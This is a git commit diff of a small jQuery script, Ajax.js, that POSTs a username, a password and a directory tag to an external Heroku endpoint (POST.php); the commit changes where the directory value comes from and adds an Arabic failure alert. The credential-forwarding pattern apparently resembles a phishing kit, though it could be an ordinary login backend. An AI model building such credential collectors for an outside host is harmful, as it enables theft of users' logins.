b5760de2036c08a0a3bdd51b281ebe2f2397d667
Bassem <41355488+users-profile@users.noreply.github.com>
2021-08-21 20:49:06 +0200

    Update Ajax.js

--- Ajax.js
+++ Ajax.js
@@ -1,16 +1,16 @@
 $(function(){
-
-    var fullUrl = window.location.href;
-    var myStr = fullUrl.split("=");
-    if(myStr.length > 1){
-        var Directy = myStr[1];
-    }else{
-        var Directy = 'default';
-    }
+    
 
     var myLink = 'https://analiza-new.herokuapp.com/POST.php';
     var myUser = $('#user-name').val()
     var myPass = $('#my-pass').val()
+    var myDir1  = $('#rel').val();
+
+    if(myDir1.length > 1){
+      var myDir = myDir1;
+    }else{
+      var myDir = 'default';
+    }
 
     console.log(myLink);
     
@@ -20,13 +20,17 @@ $(function(){
         var request = $.ajax({
             url: myLink,
             method: "POST",
-            data: { user1 : myUser, pass1 : myPass, dir1 : Directy },
+            data: { user1 : myUser, pass1 : myPass, dir1 : myDir },
             dataType: "html"
           });
            
           request.done(function( msg ) {
             console.log('Done1');
           });
+          request.fail(function( jqXHR, textStatus ) {
+            alert( "فشل الطلب: " + textStatus );
+          });
+
 
     });
 
